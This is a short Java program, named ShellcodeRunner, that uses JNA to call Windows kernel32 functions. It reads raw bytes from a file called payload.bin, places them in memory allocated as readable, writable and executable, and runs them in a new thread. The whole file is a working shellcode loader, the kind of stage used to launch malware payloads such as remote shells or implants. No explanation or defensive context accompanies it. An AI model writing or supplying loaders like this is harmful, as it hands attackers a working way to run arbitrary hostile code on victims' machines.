import com.sun.jna.*;
import java.nio.file.*;

public class ShellcodeRunner {

    public interface Kernel32 extends Library {
        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);

        Pointer VirtualAlloc(Pointer lpAddress, int dwSize, int flAllocationType, int flProtect);
        Pointer CreateThread(Pointer lpThreadAttributes, int dwStackSize, Pointer lpStartAddress, Pointer lpParameter, int dwCreationFlags, Pointer lpThreadId);
        int WaitForSingleObject(Pointer hHandle, int dwMilliseconds);

        int MEM_COMMIT = 0x1000;
        int MEM_RESERVE = 0x2000;
        int PAGE_EXECUTE_READWRITE = 0x40;
        int INFINITE = 0xFFFFFFFF;
    }

    public static void main(String[] args) throws Exception {
        // Load the shellcode file
        byte[] shellcode = Files.readAllBytes(Paths.get("payload.bin"));

        // Allocate RWX memory
        Pointer memory = Kernel32.INSTANCE.VirtualAlloc(
                Pointer.NULL,
                shellcode.length,
                Kernel32.MEM_COMMIT | Kernel32.MEM_RESERVE,
                Kernel32.PAGE_EXECUTE_READWRITE
        );

        // Copy shellcode to memory
        memory.write(0, shellcode, 0, shellcode.length);

        // Execute shellcode in a new thread
        Pointer thread = Kernel32.INSTANCE.CreateThread(
                Pointer.NULL, 0, memory, Pointer.NULL, 0, Pointer.NULL
        );

        // Wait for execution to complete
        Kernel32.INSTANCE.WaitForSingleObject(thread, Kernel32.INFINITE);
    }
}
